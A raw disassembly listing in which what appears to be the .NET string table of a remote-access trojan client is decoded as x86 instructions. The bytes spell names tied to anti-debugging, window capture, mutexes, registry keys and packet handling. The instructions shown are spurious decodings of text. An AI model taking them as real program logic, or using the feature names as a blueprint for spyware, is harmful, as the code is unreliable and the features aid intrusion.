  4090ab:	00 53 79             	add    %dl,0x79(%ebx)
  4090ae:	73 74                	jae    0x409124
  4090b0:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b2:	45                   	inc    %ebp
  4090b3:	76 65                	jbe    0x40911a
  4090b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b6:	74 73                	je     0x40912b
  4090b8:	00 50 6f             	add    %dl,0x6f(%eax)
  4090bb:	72 74                	jb     0x409131
  4090bd:	73 00                	jae    0x4090bf
  4090bf:	45                   	inc    %ebp
  4090c0:	78 69                	js     0x40912b
  4090c2:	73 74                	jae    0x409138
  4090c4:	73 00                	jae    0x4090c6
  4090c6:	48                   	dec    %eax
  4090c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c8:	73 74                	jae    0x40913e
  4090ca:	73 00                	jae    0x4090cc
  4090cc:	41                   	inc    %ecx
  4090cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ce:	74 69                	je     0x409139
  4090d0:	76 69                	jbe    0x40913b
  4090d2:	72 75                	jb     0x409149
  4090d4:	73 00                	jae    0x4090d6
  4090d6:	43                   	inc    %ebx
  4090d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d9:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090dc:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090df:	61                   	popa
  4090e0:	67 65 46             	addr16 gs inc %esi
  4090e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e4:	72 6d                	jb     0x409153
  4090e6:	61                   	popa
  4090e7:	74 00                	je     0x4090e9
  4090e9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090eb:	72 6d                	jb     0x40915a
  4090ed:	61                   	popa
  4090ee:	74 00                	je     0x4090f0
  4090f0:	57                   	push   %edi
  4090f1:	72 69                	jb     0x40915c
  4090f3:	74 65                	je     0x40915a
  4090f5:	46                   	inc    %esi
  4090f6:	6c                   	insb   (%dx),%es:(%edi)
  4090f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f8:	61                   	popa
  4090f9:	74 00                	je     0x4090fb
  4090fb:	67 65 74 5f          	addr16 gs je 0x40915e
  4090ff:	41                   	inc    %ecx
  409100:	73 46                	jae    0x409148
  409102:	6c                   	insb   (%dx),%es:(%edi)
  409103:	6f                   	outsl  %ds:(%esi),(%dx)
  409104:	61                   	popa
  409105:	74 00                	je     0x409107
  409107:	73 65                	jae    0x40916e
  409109:	74 5f                	je     0x40916a
  40910b:	41                   	inc    %ecx
  40910c:	73 46                	jae    0x409154
  40910e:	6c                   	insb   (%dx),%es:(%edi)
  40910f:	6f                   	outsl  %ds:(%esi),(%dx)
  409110:	61                   	popa
  409111:	74 00                	je     0x409113
  409113:	47                   	inc    %edi
  409114:	65 74 41             	gs je  0x409158
  409117:	73 46                	jae    0x40915f
  409119:	6c                   	insb   (%dx),%es:(%edi)
  40911a:	6f                   	outsl  %ds:(%esi),(%dx)
  40911b:	61                   	popa
  40911c:	74 00                	je     0x40911e
  40911e:	53                   	push   %ebx
  40911f:	65 74 41             	gs je  0x409163
  409122:	73 46                	jae    0x40916a
  409124:	6c                   	insb   (%dx),%es:(%edi)
  409125:	6f                   	outsl  %ds:(%esi),(%dx)
  409126:	61                   	popa
  409127:	74 00                	je     0x409129
  409129:	46                   	inc    %esi
  40912a:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409131:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409135:	61                   	popa
  409136:	6e                   	outsb  %ds:(%esi),(%dx)
  409137:	61                   	popa
  409138:	67 65 6d             	gs insl (%dx),%es:(%di)
  40913b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40913d:	74 42                	je     0x409181
  40913f:	61                   	popa
  409140:	73 65                	jae    0x4091a7
  409142:	4f                   	dec    %edi
  409143:	62 6a 65             	bound  %ebp,0x65(%edx)
  409146:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40914a:	6f                   	outsl  %ds:(%esi),(%dx)
  40914b:	72 63                	jb     0x4091b0
  40914d:	65 50                	gs push %eax
  40914f:	61                   	popa
  409150:	74 68                	je     0x4091ba
  409152:	4f                   	dec    %edi
  409153:	62 6a 65             	bound  %ebp,0x65(%edx)
  409156:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40915a:	6f                   	outsl  %ds:(%esi),(%dx)
  40915b:	6c                   	insb   (%dx),%es:(%edi)
  40915c:	6c                   	insb   (%dx),%es:(%edi)
  40915d:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409162:	6f                   	outsl  %ds:(%esi),(%dx)
  409163:	6e                   	outsb  %ds:(%esi),(%dx)
  409164:	6e                   	outsb  %ds:(%esi),(%dx)
  409165:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40916a:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40916e:	6e                   	outsb  %ds:(%esi),(%dx)
  40916f:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409174:	65 74 00             	gs je  0x409177
  409177:	53                   	push   %ebx
  409178:	79 73                	jns    0x4091ed
  40917a:	74 65                	je     0x4091e1
  40917c:	6d                   	insl   (%dx),%es:(%edi)
  40917d:	2e 4e                	cs dec %esi
  40917f:	65 74 00             	gs je  0x409182
  409182:	53                   	push   %ebx
  409183:	65 74 00             	gs je  0x409186
  409186:	54                   	push   %esp
  409187:	61                   	popa
  409188:	72 67                	jb     0x4091f1
  40918a:	65 74 00             	gs je  0x40918d
  40918d:	43                   	inc    %ebx
  40918e:	6c                   	insb   (%dx),%es:(%edi)
  40918f:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  409196:	6e                   	outsb  %ds:(%esi),(%dx)
  409197:	64 6c                	fs insb (%dx),%es:(%edi)
  409199:	65 5f                	gs pop %edi
  40919b:	50                   	push   %eax
  40919c:	61                   	popa
  40919d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a0:	74 00                	je     0x4091a2
  4091a2:	4b                   	dec    %ebx
  4091a3:	65 65 70 41          	gs gs jo 0x4091e8
  4091a7:	6c                   	insb   (%dx),%es:(%edi)
  4091a8:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091af:	65 74 00             	gs je  0x4091b2
  4091b2:	43                   	inc    %ebx
  4091b3:	6c                   	insb   (%dx),%es:(%edi)
  4091b4:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091bb:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091bf:	53                   	push   %ebx
  4091c0:	79 73                	jns    0x409235
  4091c2:	74 65                	je     0x409229
  4091c4:	6d                   	insl   (%dx),%es:(%edi)
  4091c5:	2e 43                	cs inc %ebx
  4091c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c8:	6c                   	insb   (%dx),%es:(%edi)
  4091c9:	6c                   	insb   (%dx),%es:(%edi)
  4091ca:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d0:	73 2e                	jae    0x409200
  4091d2:	49                   	dec    %ecx
  4091d3:	45                   	inc    %ebp
  4091d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d5:	75 6d                	jne    0x409244
  4091d7:	65 72 61             	gs jb  0x40923b
  4091da:	74 6f                	je     0x40924b
  4091dc:	72 2e                	jb     0x40920c
  4091de:	52                   	push   %edx
  4091df:	65 73 65             	gs jae 0x409247
  4091e2:	74 00                	je     0x4091e4
  4091e4:	67 65 74 5f          	addr16 gs je 0x409247
  4091e8:	4f                   	dec    %edi
  4091e9:	66 66 73 65          	data16 data16 jae 0x409252
  4091ed:	74 00                	je     0x4091ef
  4091ef:	73 65                	jae    0x409256
  4091f1:	74 5f                	je     0x409252
  4091f3:	4f                   	dec    %edi
  4091f4:	66 66 73 65          	data16 data16 jae 0x40925d
  4091f8:	74 00                	je     0x4091fa
  4091fa:	53                   	push   %ebx
  4091fb:	70 6c                	jo     0x409269
  4091fd:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409204:	6e 
  409205:	74 4f                	je     0x409256
  409207:	6e                   	outsb  %ds:(%esi),(%dx)
  409208:	45                   	inc    %ebp
  409209:	78 69                	js     0x409274
  40920b:	74 00                	je     0x40920d
  40920d:	53                   	push   %ebx
  40920e:	61                   	popa
  40920f:	6c                   	insb   (%dx),%es:(%edi)
  409210:	74 00                	je     0x409212
  409212:	49                   	dec    %ecx
  409213:	41                   	inc    %ecx
  409214:	73 79                	jae    0x40928f
  409216:	6e                   	outsb  %ds:(%esi),(%dx)
  409217:	63 52 65             	arpl   %edx,0x65(%edx)
  40921a:	73 75                	jae    0x409291
  40921c:	6c                   	insb   (%dx),%es:(%edi)
  40921d:	74 00                	je     0x40921f
  40921f:	54                   	push   %esp
  409220:	6f                   	outsl  %ds:(%esi),(%dx)
  409221:	55                   	push   %ebp
  409222:	70 70                	jo     0x409294
  409224:	65 72 49             	gs jb  0x409270
  409227:	6e                   	outsb  %ds:(%esi),(%dx)
  409228:	76 61                	jbe    0x40928b
  40922a:	72 69                	jb     0x409295
  40922c:	61                   	popa
  40922d:	6e                   	outsb  %ds:(%esi),(%dx)
  40922e:	74 00                	je     0x409230
  409230:	57                   	push   %edi
  409231:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409235:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40923c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409243:	65 
  409244:	43                   	inc    %ebx
  409245:	6c                   	insb   (%dx),%es:(%edi)
  409246:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40924d:	74 5f                	je     0x4092ae
  40924f:	53                   	push   %ebx
  409250:	73 6c                	jae    0x4092be
  409252:	43                   	inc    %ebx
  409253:	6c                   	insb   (%dx),%es:(%edi)
  409254:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40925b:	74 5f                	je     0x4092bc
  40925d:	53                   	push   %ebx
  40925e:	73 6c                	jae    0x4092cc
  409260:	43                   	inc    %ebx
  409261:	6c                   	insb   (%dx),%es:(%edi)
  409262:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409269:	74 5f                	je     0x4092ca
  40926b:	54                   	push   %esp
  40926c:	63 70 43             	arpl   %esi,0x43(%eax)
  40926f:	6c                   	insb   (%dx),%es:(%edi)
  409270:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409277:	74 5f                	je     0x4092d8
  409279:	54                   	push   %esp
  40927a:	63 70 43             	arpl   %esi,0x43(%eax)
  40927d:	6c                   	insb   (%dx),%es:(%edi)
  40927e:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409285:	74 68                	je     0x4092ef
  409287:	65 6e                	outsb  %gs:(%esi),(%dx)
  409289:	74 69                	je     0x4092f4
  40928b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40928e:	65 41                	gs inc %ecx
  409290:	73 43                	jae    0x4092d5
  409292:	6c                   	insb   (%dx),%es:(%edi)
  409293:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40929a:	73 74                	jae    0x409310
  40929c:	65 6d                	gs insl (%dx),%es:(%edi)
  40929e:	2e 4d                	cs dec %ebp
  4092a0:	61                   	popa
  4092a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a2:	61                   	popa
  4092a3:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092a8:	74 00                	je     0x4092aa
  4092aa:	45                   	inc    %ebp
  4092ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ac:	76 69                	jbe    0x409317
  4092ae:	72 6f                	jb     0x40931f
  4092b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b1:	6d                   	insl   (%dx),%es:(%edi)
  4092b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b4:	74 00                	je     0x4092b6
  4092b6:	70 61                	jo     0x409319
  4092b8:	72 65                	jb     0x40931f
  4092ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bb:	74 00                	je     0x4092bd
  4092bd:	53                   	push   %ebx
  4092be:	79 73                	jns    0x409333
  4092c0:	74 65                	je     0x409327
  4092c2:	6d                   	insl   (%dx),%es:(%edi)
  4092c3:	2e 43                	cs inc %ebx
  4092c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c6:	6c                   	insb   (%dx),%es:(%edi)
  4092c7:	6c                   	insb   (%dx),%es:(%edi)
  4092c8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ce:	73 2e                	jae    0x4092fe
  4092d0:	49                   	dec    %ecx
  4092d1:	45                   	inc    %ebp
  4092d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d3:	75 6d                	jne    0x409342
  4092d5:	65 72 61             	gs jb  0x409339
  4092d8:	74 6f                	je     0x409349
  4092da:	72 2e                	jb     0x40930a
  4092dc:	43                   	inc    %ebx
  4092dd:	75 72                	jne    0x409351
  4092df:	72 65                	jb     0x409346
  4092e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e2:	74 00                	je     0x4092e4
  4092e4:	53                   	push   %ebx
  4092e5:	79 73                	jns    0x40935a
  4092e7:	74 65                	je     0x40934e
  4092e9:	6d                   	insl   (%dx),%es:(%edi)
  4092ea:	2e 43                	cs inc %ebx
  4092ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ed:	6c                   	insb   (%dx),%es:(%edi)
  4092ee:	6c                   	insb   (%dx),%es:(%edi)
  4092ef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f5:	73 2e                	jae    0x409325
  4092f7:	49                   	dec    %ecx
  4092f8:	45                   	inc    %ebp
  4092f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fa:	75 6d                	jne    0x409369
  4092fc:	65 72 61             	gs jb  0x409360
  4092ff:	74 6f                	je     0x409370
  409301:	72 2e                	jb     0x409331
  409303:	67 65 74 5f          	addr16 gs je 0x409366
  409307:	43                   	inc    %ebx
  409308:	75 72                	jne    0x40937c
  40930a:	72 65                	jb     0x409371
  40930c:	6e                   	outsb  %ds:(%esi),(%dx)
  40930d:	74 00                	je     0x40930f
  40930f:	47                   	inc    %edi
  409310:	65 74 43             	gs je  0x409356
  409313:	75 72                	jne    0x409387
  409315:	72 65                	jb     0x40937c
  409317:	6e                   	outsb  %ds:(%esi),(%dx)
  409318:	74 00                	je     0x40931a
  40931a:	43                   	inc    %ebx
  40931b:	68 65 63 6b 52       	push   $0x526b6365
  409320:	65 6d                	gs insl (%dx),%es:(%edi)
  409322:	6f                   	outsl  %ds:(%esi),(%dx)
  409323:	74 65                	je     0x40938a
  409325:	44                   	inc    %esp
  409326:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40932a:	67 65 72 50          	addr16 gs jb 0x40937e
  40932e:	72 65                	jb     0x409395
  409330:	73 65                	jae    0x409397
  409332:	6e                   	outsb  %ds:(%esi),(%dx)
  409333:	74 00                	je     0x409335
  409335:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40933c:	67 65 72 50          	addr16 gs jb 0x409390
  409340:	72 65                	jb     0x4093a7
  409342:	73 65                	jae    0x4093a9
  409344:	6e                   	outsb  %ds:(%esi),(%dx)
  409345:	74 00                	je     0x409347
  409347:	67 65 74 5f          	addr16 gs je 0x4093aa
  40934b:	52                   	push   %edx
  40934c:	65 6d                	gs insl (%dx),%es:(%edi)
  40934e:	6f                   	outsl  %ds:(%esi),(%dx)
  40934f:	74 65                	je     0x4093b6
  409351:	45                   	inc    %ebp
  409352:	6e                   	outsb  %ds:(%esi),(%dx)
  409353:	64 50                	fs push %eax
  409355:	6f                   	outsl  %ds:(%esi),(%dx)
  409356:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40935d:	5f                   	pop    %edi
  40935e:	43                   	inc    %ebx
  40935f:	6f                   	outsl  %ds:(%esi),(%dx)
  409360:	75 6e                	jne    0x4093d0
  409362:	74 00                	je     0x409364
  409364:	67 65 74 5f          	addr16 gs je 0x4093c7
  409368:	50                   	push   %eax
  409369:	72 6f                	jb     0x4093da
  40936b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40936e:	73 6f                	jae    0x4093df
  409370:	72 43                	jb     0x4093b5
  409372:	6f                   	outsl  %ds:(%esi),(%dx)
  409373:	75 6e                	jne    0x4093e3
  409375:	74 00                	je     0x409377
  409377:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40937a:	6e                   	outsb  %ds:(%esi),(%dx)
  40937b:	74 00                	je     0x40937d
  40937d:	47                   	inc    %edi
  40937e:	65 74 50             	gs je  0x4093d1
  409381:	61                   	popa
  409382:	74 68                	je     0x4093ec
  409384:	52                   	push   %edx
  409385:	6f                   	outsl  %ds:(%esi),(%dx)
  409386:	6f                   	outsl  %ds:(%esi),(%dx)
  409387:	74 00                	je     0x409389
  409389:	44                   	inc    %esp
  40938a:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40938e:	70 74                	jo     0x409404
  409390:	00 45 6e             	add    %al,0x6e(%ebp)
  409393:	63 72 79             	arpl   %esi,0x79(%edx)
  409396:	70 74                	jo     0x40940c
  409398:	00 50 61             	add    %dl,0x61(%eax)
  40939b:	72 61                	jb     0x4093fe
  40939d:	6d                   	insl   (%dx),%es:(%edi)
  40939e:	65 74 65             	gs je  0x409406
  4093a1:	72 69                	jb     0x40940c
  4093a3:	7a 65                	jp     0x40940a
  4093a5:	64 54                	fs push %esp
  4093a7:	68 72 65 61 64       	push   $0x64616572
  4093ac:	53                   	push   %ebx
  4093ad:	74 61                	je     0x409410
  4093af:	72 74                	jb     0x409425
  4093b1:	00 43 6f             	add    %al,0x6f(%ebx)
  4093b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b5:	76 65                	jbe    0x40941c
  4093b7:	72 74                	jb     0x40942d
  4093b9:	00 46 61             	add    %al,0x61(%esi)
  4093bc:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093c3:	54 
  4093c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c5:	4c                   	dec    %esp
  4093c6:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093cd:	75 74                	jne    0x409443
  4093cf:	00 53 79             	add    %dl,0x79(%ebx)
  4093d2:	73 74                	jae    0x409448
  4093d4:	65 6d                	gs insl (%dx),%es:(%edi)
  4093d6:	2e 43                	cs inc %ebx
  4093d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d9:	6c                   	insb   (%dx),%es:(%edi)
  4093da:	6c                   	insb   (%dx),%es:(%edi)
  4093db:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e1:	73 2e                	jae    0x409411
  4093e3:	49                   	dec    %ecx
  4093e4:	45                   	inc    %ebp
  4093e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e6:	75 6d                	jne    0x409455
  4093e8:	65 72 61             	gs jb  0x40944c
  4093eb:	74 6f                	je     0x40945c
  4093ed:	72 2e                	jb     0x40941d
  4093ef:	4d                   	dec    %ebp
  4093f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f1:	76 65                	jbe    0x409458
  4093f3:	4e                   	dec    %esi
  4093f4:	65 78 74             	gs js  0x40946b
  4093f7:	00 53 79             	add    %dl,0x79(%ebx)
  4093fa:	73 74                	jae    0x409470
  4093fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4093fe:	2e 54                	cs push %esp
  409400:	65 78 74             	gs js  0x409477
  409403:	00 47 65             	add    %al,0x65(%edi)
  409406:	74 57                	je     0x40945f
  409408:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40940f:	78 74                	js     0x409485
  409411:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409415:	74 00                	je     0x409417
  409417:	76 00                	jbe    0x409419
  409419:	47                   	inc    %edi
  40941a:	65 74 46             	gs je  0x409463
  40941d:	6f                   	outsl  %ds:(%esi),(%dx)
  40941e:	72 65                	jb     0x409485
  409420:	67 72 6f             	addr16 jb 0x409492
  409423:	75 6e                	jne    0x409493
  409425:	64 57                	fs push %edi
  409427:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40942e:	65 74 5f             	gs je  0x409490
  409431:	43                   	inc    %ebx
  409432:	72 65                	jb     0x409499
  409434:	61                   	popa
  409435:	74 65                	je     0x40949c
  409437:	4e                   	dec    %esi
  409438:	6f                   	outsl  %ds:(%esi),(%dx)
  409439:	57                   	push   %edi
  40943a:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409441:	6e                   	outsb  %ds:(%esi),(%dx)
  409442:	64 65 78 00          	fs gs js 0x409446
  409446:	43                   	inc    %ebx
  409447:	6c                   	insb   (%dx),%es:(%edi)
  409448:	6f                   	outsl  %ds:(%esi),(%dx)
  409449:	73 65                	jae    0x4094b0
  40944b:	4d                   	dec    %ebp
  40944c:	75 74                	jne    0x4094c2
  40944e:	65 78 00             	gs js  0x409451
  409451:	43                   	inc    %ebx
  409452:	72 65                	jb     0x4094b9
  409454:	61                   	popa
  409455:	74 65                	je     0x4094bc
  409457:	4d                   	dec    %ebp
  409458:	75 74                	jne    0x4094ce
  40945a:	65 78 00             	gs js  0x40945d
  40945d:	57                   	push   %edi
  40945e:	61                   	popa
  40945f:	74 65                	je     0x4094c6
  409461:	72 66                	jb     0x4094c9
  409463:	6f                   	outsl  %ds:(%esi),(%dx)
  409464:	78 00                	js     0x409466
  409466:	44                   	inc    %esp
  409467:	65 6c                	gs insb (%dx),%es:(%edi)
  409469:	61                   	popa
  40946a:	79 00                	jns    0x40946c
  40946c:	57                   	push   %edi
  40946d:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409474:	61                   	popa
  409475:	79 00                	jns    0x409477
  409477:	49                   	dec    %ecx
  409478:	6e                   	outsb  %ds:(%esi),(%dx)
  409479:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409480:	65 
  409481:	41                   	inc    %ecx
  409482:	72 72                	jb     0x4094f6
  409484:	61                   	popa
  409485:	79 00                	jns    0x409487
  409487:	4d                   	dec    %ebp
  409488:	73 67                	jae    0x4094f1
  40948a:	50                   	push   %eax
  40948b:	61                   	popa
  40948c:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40948f:	72 72                	jb     0x409503
  409491:	61                   	popa
  409492:	79 00                	jns    0x409494
  409494:	54                   	push   %esp
  409495:	6f                   	outsl  %ds:(%esi),(%dx)
  409496:	41                   	inc    %ecx
  409497:	72 72                	jb     0x40950b
  409499:	61                   	popa
  40949a:	79 00                	jns    0x40949c
  40949c:	67 65 74 5f          	addr16 gs je 0x4094ff
  4094a0:	41                   	inc    %ecx
  4094a1:	73 41                	jae    0x4094e4
  4094a3:	72 72                	jb     0x409517
  4094a5:	61                   	popa
  4094a6:	79 00                	jns    0x4094a8
  4094a8:	72 65                	jb     0x40950f
  4094aa:	66 41                	inc    %cx
  4094ac:	73 41                	jae    0x4094ef
  4094ae:	72 72                	jb     0x409522
  4094b0:	61                   	popa
  4094b1:	79 00                	jns    0x4094b3
  4094b3:	67 65 74 5f          	addr16 gs je 0x409516
  4094b7:	4b                   	dec    %ebx
  4094b8:	65 79 00             	gs jns 0x4094bb
  4094bb:	73 65                	jae    0x409522
  4094bd:	74 5f                	je     0x40951e
  4094bf:	4b                   	dec    %ebx
  4094c0:	65 79 00             	gs jns 0x4094c3
  4094c3:	43                   	inc    %ebx
  4094c4:	72 65                	jb     0x40952b
  4094c6:	61                   	popa
  4094c7:	74 65                	je     0x40952e
  4094c9:	53                   	push   %ebx
  4094ca:	75 62                	jne    0x40952e
  4094cc:	4b                   	dec    %ebx
  4094cd:	65 79 00             	gs jns 0x4094d0
  4094d0:	44                   	inc    %esp
  4094d1:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d3:	65 74 65             	gs je  0x40953b
  4094d6:	53                   	push   %ebx
  4094d7:	75 62                	jne    0x40953b
  4094d9:	4b                   	dec    %ebx
  4094da:	65 79 00             	gs jns 0x4094dd
  4094dd:	4f                   	dec    %edi
  4094de:	70 65                	jo     0x409545
  4094e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e1:	53                   	push   %ebx
  4094e2:	75 62                	jne    0x409546
  4094e4:	4b                   	dec    %ebx
  4094e5:	65 79 00             	gs jns 0x4094e8
  4094e8:	67 65 74 5f          	addr16 gs je 0x40954b
  4094ec:	50                   	push   %eax
  4094ed:	75 62                	jne    0x409551
  4094ef:	6c                   	insb   (%dx),%es:(%edi)
  4094f0:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f7:	61                   	popa
  4094f8:	75 74                	jne    0x40956e
  4094fa:	68 4b 65 79 00       	push   $0x79654b
  4094ff:	6d                   	insl   (%dx),%es:(%edi)
  409500:	61                   	popa
  409501:	73 74                	jae    0x409577
  409503:	65 72 4b             	gs jb  0x409551
  409506:	65 79 00             	gs jns 0x409509
  409509:	52                   	push   %edx
  40950a:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409511:	4b 65 
  409513:	79 00                	jns    0x409515
  409515:	5f                   	pop    %edi
  409516:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951a:	53                   	push   %ebx
  40951b:	79 73                	jns    0x409590
  40951d:	74 65                	je     0x409584
  40951f:	6d                   	insl   (%dx),%es:(%edi)
  409520:	2e 53                	cs push %ebx
  409522:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409526:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952d:	70 
  40952e:	74 6f                	je     0x40959f
  409530:	67 72 61             	addr16 jb 0x409594
  409533:	70 68                	jo     0x40959d
  409535:	79 00                	jns    0x409537
  409537:	41                   	inc    %ecx
  409538:	73 73                	jae    0x4095ad
  40953a:	65 6d                	gs insl (%dx),%es:(%edi)
  40953c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409540:	41                   	inc    %ecx
  409541:	64 64 72 65          	fs fs jb 0x4095aa
  409545:	73 73                	jae    0x4095ba
  409547:	46                   	inc    %esi
  409548:	61                   	popa
  409549:	6d                   	insl   (%dx),%es:(%edi)
  40954a:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409551:	63 
  409552:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409556:	79 00                	jns    0x409558
  409558:	57                   	push   %edi
  409559:	72 69                	jb     0x4095c4
  40955b:	74 65                	je     0x4095c2
  40955d:	42                   	inc    %edx
  40955e:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409565:	6f                   	outsl  %ds:(%esi),(%dx)
  409566:	42                   	inc    %edx
  409567:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40956e:	65 74 5f             	gs je  0x4095d0
  409571:	53                   	push   %ebx
  409572:	79 73                	jns    0x4095e7
  409574:	74 65                	je     0x4095db
  409576:	6d                   	insl   (%dx),%es:(%edi)
  409577:	44                   	inc    %esp
  409578:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40957f:	79 00                	jns    0x409581
  409581:	53                   	push   %ebx
  409582:	65 74 52             	gs je  0x4095d7
  409585:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958c:	00 6f 
  40958e:	70 5f                	jo     0x4095ef
  409590:	45                   	inc    %ebp
  409591:	71 75                	jno    0x409608
  409593:	61                   	popa
  409594:	6c                   	insb   (%dx),%es:(%edi)
  409595:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959c:	49 
  40959d:	6e                   	outsb  %ds:(%esi),(%dx)
  40959e:	65 71 75             	gs jno 0x409616
  4095a1:	61                   	popa
  4095a2:	6c                   	insb   (%dx),%es:(%edi)
  4095a3:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095aa:	74 
  4095ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4095ad:	2e 4e                	cs dec %esi
  4095af:	65 74 2e             	gs je  0x4095e0
  4095b2:	53                   	push   %ebx
  4095b3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b7:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095be:	64 
  4095bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c0:	77 73                	ja     0x409635
  4095c2:	49                   	dec    %ecx
  4095c3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c6:	74 69                	je     0x409631
  4095c8:	74 79                	je     0x409643
